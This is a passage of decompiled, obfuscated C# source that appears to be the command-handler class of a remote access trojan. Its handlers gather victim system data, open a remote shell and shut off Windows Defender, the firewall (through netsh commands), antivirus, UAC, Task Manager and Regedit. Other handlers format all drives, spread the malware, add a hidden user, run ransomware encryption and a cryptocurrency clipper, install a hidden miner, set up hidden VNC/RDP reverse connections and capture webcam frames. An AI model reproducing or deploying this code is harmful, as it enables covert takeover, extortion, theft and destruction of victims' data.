				if (!GClass59.smethod_2(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\RunOnce", command.Name))
				{
					throw new Exception("Could not remove value");
				}
				break;
			case 6:
			{
				string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), command.Name);
				if (!File.Exists(path))
				{
					throw new IOException("File does not exist");
				}
				File.Delete(path);
				break;
			}
			}
		}
		catch (Exception ex)
		{
			new SetStatus($"Removing Autostart Item failed: {ex.Message}").Execute(client);
		}
	}

	public static void smethod_44(GetSystemInfo command, GClass13 client)
	{
		try
		{
			IPGlobalProperties iPGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
			string text = ((!string.IsNullOrEmpty(iPGlobalProperties.DomainName)) ? iPGlobalProperties.DomainName : "-");
			string text2 = ((!string.IsNullOrEmpty(iPGlobalProperties.HostName)) ? iPGlobalProperties.HostName : "-");
			new GetSystemInfoResponse(new string[36]
			{
				"Processor (CPU)",
				GClass46.smethod_2(),
				"Memory (RAM)",
				$"{GClass46.smethod_3()} MB",
				"Video Card (GPU)",
				GClass46.smethod_4(),
				"Username",
				GClass65.smethod_0(),
				"PC Name",
				GClass64.smethod_1(),
				"Domain Name",
				text,
				"Host Name",
				text2,
				"System Drive",
				Path.GetPathRoot(Environment.SystemDirectory),
				"System Directory",
				Environment.SystemDirectory,
				"Uptime",
				GClass64.smethod_0(),
				"MAC Address",
				GClass46.smethod_6(),
				"LAN IP Address",
				GClass46.smethod_5(),
				"WAN IP Address",
				GClass49.GeoInfo.Ip,
				"Antivirus",
				GClass64.smethod_2(),
				"Firewall",
				GClass64.smethod_3(),
				"Time Zone",
				GClass49.GeoInfo.Timezone,
				"Country",
				GClass49.GeoInfo.Country,
				"ISP",
				GClass49.GeoInfo.Isp
			}).Execute(client);
		}
		catch
		{
		}
	}

	public static void smethod_45(GetVncInfo command, GClass13 client)
	{
		try
		{
			IPGlobalProperties iPGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
			if (!string.IsNullOrEmpty(iPGlobalProperties.DomainName))
			{
				_ = iPGlobalProperties.DomainName;
			}
			if (!string.IsNullOrEmpty(iPGlobalProperties.HostName))
			{
				_ = iPGlobalProperties.HostName;
			}
			new GetVncInfoResponse(new string[2]
			{
				"Login",
				GClass46.smethod_7()
			}).Execute(client);
		}
		catch
		{
		}
	}

	public static void smethod_46(GetRdpInfo command, GClass13 client)
	{
		try
		{
			IPGlobalProperties iPGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
			if (!string.IsNullOrEmpty(iPGlobalProperties.DomainName))
			{
				_ = iPGlobalProperties.DomainName;
			}
			if (!string.IsNullOrEmpty(iPGlobalProperties.HostName))
			{
				_ = iPGlobalProperties.HostName;
			}
			new GetVncInfoResponse(new string[2]
			{
				"Login",
				GClass46.smethod_8()
			}).Execute(client);
		}
		catch
		{
		}
	}

	public static void smethod_47(GetProcesses command, GClass13 client)
	{
		Process[] processes = Process.GetProcesses();
		string[] array = new string[processes.Length];
		int[] array2 = new int[processes.Length];
		string[] array3 = new string[processes.Length];
		int num = 0;
		Process[] array4 = processes;
		foreach (Process process in array4)
		{
			array[num] = process.ProcessName + ".exe";
			array2[num] = process.Id;
			array3[num] = process.MainWindowTitle;
			num++;
		}
		new GetProcessesResponse(array, array2, array3).Execute(client);
	}

	public static void smethod_48(DoProcessStart command, GClass13 client)
	{
		if (string.IsNullOrEmpty(command.Processname))
		{
			new SetStatus("Process could not be started!").Execute(client);
			return;
		}
		try
		{
			Process.Start(new ProcessStartInfo
			{
				UseShellExecute = true,
				FileName = command.Processname
			});
		}
		catch
		{
			new SetStatus("Process could not be started!").Execute(client);
		}
		finally
		{
			smethod_47(new GetProcesses(), client);
		}
	}

	public static void smethod_49(DoProcessKill command, GClass13 client)
	{
		try
		{
			Process.GetProcessById(command.PID).Kill();
		}
		catch
		{
		}
		finally
		{
			smethod_47(new GetProcesses(), client);
		}
	}

	public static void smethod_50(DoProcessHide command, GClass13 client)
	{
		try
		{
			string proccess = string.Empty;
			Process processById = Process.GetProcessById(command.PID);
			if (processById != null)
			{
				proccess = processById.ProcessName;
			}
			GClass38.smethod_0(proccess);
		}
		catch
		{
		}
		finally
		{
			smethod_47(new GetProcesses(), client);
		}
	}

	public static void smethod_51(DoAskElevate command, GClass13 client)
	{
		if (GClass65.smethod_1() != "Admin")
		{
			GClass54.smethod_1();
			try
			{
				Task.Run(delegate
				{
					GClass52.smethod_97();
				}).Wait();
			}
			catch
			{
				new SetStatus("Elevation failed.").Execute(client);
				GClass54.smethod_0(GClass5.string_7);
				return;
			}
			Class12.gclass14_0.method_21();
		}
		else
		{
			new SetStatus("Process already elevated.").Execute(client);
		}
	}

	public static void smethod_52(DoRemoveRdp command, GClass13 client)
	{
		new SetStatus("Closing Reverse Connection.").Execute(client);
		try
		{
			Task.Run(delegate
			{
				GClass52.smethod_84();
			}).Wait();
			Task.Run(async () => GClass52.DelRdpMethodAsync()).Wait();
			Task.Run(delegate
			{
				GClass52.smethod_80();
			}).Wait();
			Task.Run(delegate
			{
				GClass52.smethod_85();
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Removing HRDP module.").Execute(client);
		try
		{
			Task.Run(delegate
			{
				GClass52.smethod_25();
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Rdp Removed.").Execute(client);
	}

	public static void smethod_53(DoRemoveVnc command, GClass13 client)
	{
		new SetStatus("Removing HVNC module.").Execute(client);
		try
		{
			GClass52.smethod_80();
			Task.Run(async () => GClass52.DelRdpMethodAsync()).Wait();
			GClass52.smethod_14();
			GClass52.smethod_85();
			GClass52.smethod_80();
		}
		catch
		{
		}
		new SetStatus("Vnc Removed.").Execute(client);
	}

	public static void smethod_54(DoRemoveTunnel command, GClass13 client)
	{
		new SetStatus("Closing Reverse Connection.").Execute(client);
		try
		{
			Task.Run(async () => GClass52.DelRdpMethodAsync()).Wait();
			GClass52.smethod_80();
			GClass52.smethod_85();
		}
		catch
		{
		}
		new SetStatus("Reverse Connection Closed.").Execute(client);
	}

	public static void smethod_55(DoVncInvisible command, GClass13 client)
	{
		try
		{
			Task.Run((Action)GClass52.smethod_11).Wait();
		}
		catch
		{
		}
		new SetStatus("Vnc Process is now invisible.").Execute(client);
	}

	public static void smethod_56(DoSE command, GClass13 client)
	{
		string command2 = command.Command;
		if (shell_0 != null || !(command2 == "exit"))
		{
			if (shell_0 == null)
			{
				shell_0 = new Shell();
			}
			if (command2 == "exit")
			{
				smethod_57();
			}
			else
			{
				shell_0.ExecuteCommand(command2);
			}
		}
	}

	public static void smethod_57()
	{
		if (shell_0 != null)
		{
			shell_0.Dispose();
		}
	}

	public static void smethod_58(DoDf command, GClass13 client)
	{
		new SetStatus("Activating module Kill Defender.").Execute(client);
		try
		{
			Process[] processesByName = Process.GetProcessesByName("MSASCui");
			for (int i = 0; i < processesByName.Length; i++)
			{
				processesByName[i].Kill();
			}
			GClass52.smethod_98("netsh advfirewall set privateprofile state off >nul 2>&1");
			GClass52.smethod_98("netsh advfirewall set domainprofile state off >nul 2>&1");
			GClass52.smethod_98("netsh advfirewall set publicprofile state off >nul 2>&1");
			GClass52.smethod_70();
			GClass52.smethod_72();
		}
		catch
		{
		}
		new SetStatus("Windows Df Disabled.").Execute(client);
	}

	public static void smethod_59(DoFormat command, GClass13 client)
	{
		new SetStatus("Activating module Format.").Execute(client);
		try
		{
			Task.Run((Action)GClass52.smethod_99).Wait();
		}
		catch
		{
		}
		new SetStatus("All Drives have been Formated.").Execute(client);
	}

	public static void smethod_60(DoSpread command, GClass13 client)
	{
		new SetStatus("Activating module Spread.").Execute(client);
		try
		{
			Task.Run((Action)GClass52.smethod_88).Wait();
		}
		catch
		{
		}
		new SetStatus("Spread Completed.").Execute(client);
	}

	public static void smethod_61(DoKAi command, GClass13 client)
	{
		new SetStatus("Activating module KillAntis.").Execute(client);
		try
		{
			Task.Run((Action)GClass52.smethod_87).Wait();
		}
		catch
		{
		}
		new SetStatus("Antivirus disabled.").Execute(client);
	}

	public static void smethod_62(DoNet command, GClass13 client)
	{
		new SetStatus("Activating module NetFixer.").Execute(client);
		try
		{
			Task.Run((Action)GClass52.smethod_133).Wait();
		}
		catch
		{
		}
		new SetStatus("Net Activated.").Execute(client);
	}

	public static void smethod_63(DoUn command, GClass13 client)
	{
		new SetStatus("Activating module ExecutionPolicy1.").Execute(client);
		try
		{
			Task.Run((Action)GClass52.smethod_89).Wait();
		}
		catch
		{
		}
		new SetStatus("Policy Unrestricted Activated.").Execute(client);
	}

	public static void smethod_64(DoRs command, GClass13 client)
	{
		new SetStatus("Activating module ExecutionPolicy2.").Execute(client);
		try
		{
			Task.Run((Action)GClass52.smethod_90).Wait();
		}
		catch
		{
		}
		new SetStatus("Policy RemoteSigned Activated.").Execute(client);
	}

	public static void smethod_65(DoKRg command, GClass13 client)
	{
		new SetStatus("Activating Killer Reg.").Execute(client);
		try
		{
			Task.Run((Action)GClass52.smethod_91).Wait();
		}
		catch
		{
		}
		new SetStatus("Killer Reg Executed.").Execute(client);
	}

	public static void smethod_66(DoKit command, GClass13 client)
	{
		new SetStatus("Rootkit Executed.").Execute(client);
	}

	public static void smethod_67(DoDeleteKit command, GClass13 client)
	{
		new SetStatus("Rootkit Removed.").Execute(client);
	}

	public static void smethod_68(DoCreateUser command, GClass13 client)
	{
		new SetStatus("Activating module AddUser.").Execute(client);
		try
		{
			Task.Run((Action)GClass52.smethod_22).Wait();
		}
		catch
		{
		}
		new SetStatus("User Venom Created.").Execute(client);
	}

	public static void smethod_69(DoEncrypt command, GClass13 client)
	{
		new SetStatus("Activating Ransom.").Execute(client);
		try
		{
			Task.Run(delegate
			{
				GClass52.smethod_5(command.btc, command.eth, command.xmr);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Target Encrypted....").Execute(client);
	}

	public static void smethod_70(DoDecrypt command, GClass13 client)
	{
		new SetStatus("Activating Ransom Decryption.").Execute(client);
		try
		{
			Task.Run(delegate
			{
				GClass52.smethod_1();
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Target Decrypted...").Execute(client);
	}

	public static void smethod_71(DoClip command, GClass13 client)
	{
		new SetStatus("Activating Wallet Clipper.").Execute(client);
		string string_0 = command.btc;
		string string_1 = command.eth;
		string string_2 = command.xmr;
		try
		{
			Task.Run(delegate
			{
				GClass52.smethod_73(string_0, string_1, string_2);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Clipper Activated....").Execute(client);
	}

	public static void smethod_72(DoInstGarbage command, GClass13 client)
	{
		new SetStatus("Check if HVNC module running....").Execute(client);
		try
		{
			Task.Run((Action)GClass52.smethod_14).Wait();
		}
		catch
		{
		}
		new SetStatus("Starting Reverse Connection....").Execute(client);
		try
		{
			string string_0 = GClass5.string_12;
			Task.Run(delegate
			{
				GClass52.smethod_52(string_0, "5901");
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Adding Exclusions....").Execute(client);
		try
		{
			Task.Run((Action)GClass52.smethod_9).Wait();
		}
		catch
		{
		}
		new SetStatus("Activating HVNC module....").Execute(client);
		try
		{
			Task.Run((Action)GClass52.smethod_10).Wait();
		}
		catch
		{
		}
		new SetStatus("Get Public Url....").Execute(client);
		try
		{
			Task.Run(() => GClass52.PublicUrl()).Wait();
		}
		catch
		{
		}
		new SetStatus("Open HVNC Login....").Execute(client);
	}

	public static void smethod_73(DoInstGarbagedpr command, GClass13 client)
	{
		new SetStatus("Removing old module....").Execute(client);
		try
		{
			Task.Run(async () => GClass52.DelRdpMethodAsync()).Wait();
		}
		catch
		{
			new SetStatus("Removing Failed....").Execute(client);
		}
		new SetStatus("Rdp Folder Clean....").Execute(client);
		try
		{
			Task.Run(async () => GClass52.InstallRdpMethodAsync()).Wait();
		}
		catch
		{
			new SetStatus("Activation Failed....").Execute(client);
		}
		new SetStatus("Starting Reverse Connection....").Execute(client);
		try
		{
			string string_0 = GClass5.string_12;
			Task.Run(delegate
			{
				GClass52.smethod_52(string_0, "3389");
			}).Wait();
		}
		catch
		{
			new SetStatus("Reverse connection Failed....").Execute(client);
		}
		new SetStatus("Open HRDP Login....").Execute(client);
	}

	public static void smethod_74(DoSucksToRead command, GClass13 client)
	{
		new SetStatus("Encrypt My Tracks....").Execute(client);
		try
		{
			new SetStatus("Starting Encryption....").Execute(client);
			Task.Run(delegate
			{
				GClass52.smethod_108();
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Tracks Encrypted....").Execute(client);
	}

	public static void smethod_75(DoUpdateRtoP command, GClass13 client)
	{
		new SetStatus("Updating compatibility list....").Execute(client);
		try
		{
			new SetStatus("Starting Updating....").Execute(client);
			Task.Run(delegate
			{
				GClass52.smethod_23();
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Compatibility list updated....").Execute(client);
	}

	public static void smethod_76(DoMonitorOnoff command, GClass13 client)
	{
		new SetStatus("Closing Monitor....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_0(turnon: false);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Monitor Closed....").Execute(client);
	}

	public static void smethod_77(DoOpenCd command, GClass13 client)
	{
		new SetStatus("Eject CD....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_1(open: false);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Cd Ejected....").Execute(client);
	}

	public static void smethod_78(DoShowHideTaskbar command, GClass13 client)
	{
		new SetStatus("Hide Taskbar....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_2(show: false);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Taskbar is now hidden....").Execute(client);
	}

	public static void smethod_79(DoShowHideStartBtn command, GClass13 client)
	{
		new SetStatus("Hide Start Button....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_3(show: false);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Start Button is now hidden....").Execute(client);
	}

	public static void smethod_80(DoStartExplorer command, GClass13 client)
	{
		new SetStatus("Opening Explorer....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_4(start: false);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Explorer Opened....").Execute(client);
	}

	public static void smethod_81(DoShowHideClock command, GClass13 client)
	{
		new SetStatus("Hide Clock....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_5(show: false);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Clock is now hidden....").Execute(client);
	}

	public static void smethod_82(DoShowHideTray command, GClass13 client)
	{
		new SetStatus("Hide Tray....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_6(show: false);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Tray is now hidden....").Execute(client);
	}

	public static void smethod_83(DoShowHideDesktopIcons command, GClass13 client)
	{
		new SetStatus("Hide Desktop Icons....").Execute(client);
		try
		{
			new SetStatus("Excuting....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_7(show: false);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Desktop Icons are now hidden....").Execute(client);
	}

	public static void smethod_84(DoHideAllWindows command, GClass13 client)
	{
		new SetStatus("Hide All Windows....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_8();
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("All Windows are hidden....").Execute(client);
	}

	public static void smethod_85(DoEnableDisableTaskmgr command, GClass13 client)
	{
		new SetStatus("Disable Task Manager....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_9(show: false);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Task Manager Disabled....").Execute(client);
	}

	public static void smethod_86(DoEnableDisableRegedit command, GClass13 client)
	{
		new SetStatus("Disable Regedit....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_10(show: false);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Regedit Disabled....").Execute(client);
	}

	public static void smethod_87(DoShowHideMouse command, GClass13 client)
	{
		new SetStatus("Hide Mouse....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_11();
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Mouse is now hidden....").Execute(client);
	}

	public static void smethod_88(DoDisableuac command, GClass13 client)
	{
		new SetStatus("Disable Uac....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_12();
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Uac Disabled....").Execute(client);
	}

	public static void smethod_89(DoMonitorOn command, GClass13 client)
	{
		new SetStatus("Enabling Monitor....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_0(turnon: true);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Monitor Enabled....").Execute(client);
	}

	public static void smethod_90(DoCloseCd command, GClass13 client)
	{
		new SetStatus("Closing CD....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_1(open: true);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("CD Closed....").Execute(client);
	}

	public static void smethod_91(DoShowTaskbar command, GClass13 client)
	{
		new SetStatus("Restoring Taskbar...").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_2(show: true);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Taskbar Restored....").Execute(client);
	}

	public static void smethod_92(DoShowStartBtn command, GClass13 client)
	{
		new SetStatus("Restoring Start Button....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_3(show: true);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Start Button Restored....").Execute(client);
	}

	public static void smethod_93(DoStopExplorer command, GClass13 client)
	{
		new SetStatus("Closing Explorer....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_4(start: true);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Explorer Closed....").Execute(client);
	}

	public static void smethod_94(DoShowClock command, GClass13 client)
	{
		new SetStatus("Restoring Clock....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_5(show: true);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Clock Restored....").Execute(client);
	}

	public static void smethod_95(DoShowTray command, GClass13 client)
	{
		new SetStatus("Restoring Tray....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_6(show: true);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Tray Restored....").Execute(client);
	}

	public static void smethod_96(DoShowDesktopIcons command, GClass13 client)
	{
		new SetStatus("Restoring Desktop Icons....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_7(show: true);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Desktop Icons Restored....").Execute(client);
	}

	public static void smethod_97(DoShowAllWindows command, GClass13 client)
	{
		new SetStatus("Restoring All Windows....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_8();
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("All Windows Restored....").Execute(client);
	}

	public static void smethod_98(DoEnableTaskmgr command, GClass13 client)
	{
		new SetStatus("Enable Task Manager....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_9(show: true);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Task Manager Enabled....").Execute(client);
	}

	public static void smethod_99(DoEnableRegedit command, GClass13 client)
	{
		new SetStatus("Enable Regedit....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_10(show: true);
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Regedit Enabled....").Execute(client);
	}

	public static void smethod_100(DoShowMouse command, GClass13 client)
	{
		new SetStatus("Restoring Mouse....").Execute(client);
		try
		{
			new SetStatus("Executing....").Execute(client);
			Task.Run(delegate
			{
				Class70.smethod_11();
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Mouse Restored....").Execute(client);
	}

	public static void smethod_101(Domine command, GClass13 client)
	{
		new SetStatus("Exstracting Minner Files...").Execute(client);
		try
		{
			Task.Run(delegate
			{
				GClass52.smethod_43();
			}).Wait();
		}
		catch
		{
			new SetStatus("Exstract Minner failed...").Execute(client);
		}
		new SetStatus("Compile Minner...").Execute(client);
		try
		{
			Task.Run(delegate
			{
				GClass52.smethod_46(command.Pool, command.Wallet, command.Password, command.Algo, command.Threads);
			}).Wait();
		}
		catch
		{
			new SetStatus("Compile Minner failed...").Execute(client);
		}
		new SetStatus("Hiding Minner Folder/Files...").Execute(client);
		try
		{
			Task.Run(delegate
			{
				GClass52.smethod_44();
			}).Wait();
		}
		catch
		{
			new SetStatus("Hiding Minner failed...").Execute(client);
		}
		new SetStatus("Adding Task Minner...").Execute(client);
		try
		{
			Task.Run(delegate
			{
				GClass52.smethod_42(command.Pool, command.Wallet, command.Password, command.Algo, command.Threads);
			}).Wait();
		}
		catch
		{
			new SetStatus("Miner Adding Task failed...").Execute(client);
		}
		new SetStatus("Miner Activated...").Execute(client);
	}

	public static void smethod_102(DoStopMiner command, GClass13 client)
	{
		new SetStatus("Stoping Minner...").Execute(client);
		try
		{
			Task.Run(delegate
			{
				GClass52.smethod_38();
			}).Wait();
		}
		catch
		{
		}
		new SetStatus("Miner Stoped...").Execute(client);
	}

	[DllImport("Kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("User32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);

	public static void smethod_103(GClass13 client, GetConnections packet)
	{
		GStruct3[] array = smethod_105();
		string[] array2 = new string[array.Length];
		string[] array3 = new string[array.Length];
		string[] array4 = new string[array.Length];
		string[] array5 = new string[array.Length];
		string[] array6 = new string[array.Length];
		byte[] array7 = new byte[array.Length];
		for (int i = 0; i < array.Length; i++)
		{
			array3[i] = array[i].LocalAddress.ToString();
			array4[i] = array[i].LocalPort.ToString();
			array5[i] = array[i].RemoteAddress.ToString();
			array6[i] = array[i].RemotePort.ToString();
			array7[i] = Convert.ToByte(array[i].uint_0);
			try
			{
				Process processById = Process.GetProcessById((int)array[i].uint_3);
				array2[i] = processById.ProcessName;
			}
			catch
			{
				array2[i] = $"PID: {array[i].uint_3}";
			}
		}
		new GetConnectionsResponse(array2, array3, array4, array5, array6, array7).Execute(client);
	}

	public static void smethod_104(GClass13 client, DoCloseConnection packet)
	{
		GStruct3[] array = smethod_105();
		bool flag = false;
		for (int i = 0; i < array.Length; i++)
		{
			if (packet.LocalPort.ToString() == array[i].LocalPort.ToString() && packet.RemotePort.ToString() == array[i].RemotePort.ToString())
			{
				flag = true;
				array[i].uint_0 = 12u;
				IntPtr intPtr = Marshal.AllocCoTaskMem(Marshal.SizeOf(array[i]));
				Marshal.StructureToPtr(array[i], intPtr, fDeleteOld: false);
				SetTcpEntry(intPtr);
			}
		}
		if (flag)
		{
			smethod_103(client, new GetConnections());
		}
	}

	public static GStruct3[] smethod_105()
	{
		int ipVersion = 2;
		int dwOutBufLen = 0;
		GetExtendedTcpTable(IntPtr.Zero, ref dwOutBufLen, sort: true, 2, Enum13.const_5);
		IntPtr intPtr = Marshal.AllocHGlobal(dwOutBufLen);
		try
		{
			if (GetExtendedTcpTable(intPtr, ref dwOutBufLen, sort: true, ipVersion, Enum13.const_5) != 0)
			{
				return null;
			}
			GStruct4 gStruct = (GStruct4)Marshal.PtrToStructure(intPtr, typeof(GStruct4));
			IntPtr intPtr2 = (IntPtr)((long)intPtr + Marshal.SizeOf(gStruct.uint_0));
			GStruct3[] array = new GStruct3[gStruct.uint_0];
			for (int i = 0; i < gStruct.uint_0; i++)
			{
				GStruct3 structure = (array[i] = (GStruct3)Marshal.PtrToStructure(intPtr2, typeof(GStruct3)));
				intPtr2 = (IntPtr)((long)intPtr2 + Marshal.SizeOf(structure));
			}
			return array;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	[DllImport("iphlpapi.dll", SetLastError = true)]
	private static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion, Enum13 tblClass, uint reserved = 0u);

	[DllImport("iphlpapi.dll")]
	private static extern int SetTcpEntry(IntPtr pTcprow);

	public static void smethod_106(GetWebcams command, GClass13 client)
	{
		Dictionary<string, List<Size>> dictionary = new Dictionary<string, List<Size>>();
		foreach (FilterInfo item in new GClass80(GClass81.guid_1))
		{
			List<Size> list = new List<Size>();
			GClass82[] videoCapabilities = new VideoCaptureDevice(item.MonikerString).VideoCapabilities;
			foreach (GClass82 gClass in videoCapabilities)
			{
				list.Add(gClass.size_0);
			}
			dictionary.Add(item.Name, list);
		}
		if (dictionary.Count > 0)
		{
			new GetWebcamsResponse(dictionary).Execute(client);
		}
	}

	public static void smethod_107(GetWebcam command, GClass13 client)
	{
		gclass13_0 = client;
		bool_2 = true;
		int_0 = command.Webcam;
		int_1 = command.Resolution;
		if (!bool_1)
		{
			videoCaptureDevice_0 = new VideoCaptureDevice(new GClass80(GClass81.guid_1)[command.Webcam].MonikerString);
			videoCaptureDevice_0.Event_0 += smethod_109;
			videoCaptureDevice_0.VideoResolution = videoCaptureDevice_0.VideoCapabilities[command.Resolution];
			videoCaptureDevice_0.Start();
			bool_1 = true;
		}
	}

	public static void smethod_108(DoWebcamStop command, GClass13 client)
	{
		bool_2 = false;
		bool_1 = false;
		gclass13_0 = null;
		if (videoCaptureDevice_0 != null)
		{
			videoCaptureDevice_0.Event_0 -= smethod_109;
			videoCaptureDevice_0.Stop();
			videoCaptureDevice_0 = null;
		}
	}

	private static void smethod_109(object sender, GEventArgs6 e)
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		if (!bool_1)
		{
			videoCaptureDevice_0.Stop();
		}
		if (bool_2)
		{
			Bitmap val = (Bitmap)((Image)e.Frame).Clone();
			using (MemoryStream memoryStream = new MemoryStream())
			{
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Bmp());
				new GetWebcamResponse(memoryStream.ToArray(), int_0, int_1).Execute(gclass13_0);
				memoryStream.Close();
			}
			bool_2 = false;
		}
	}
}
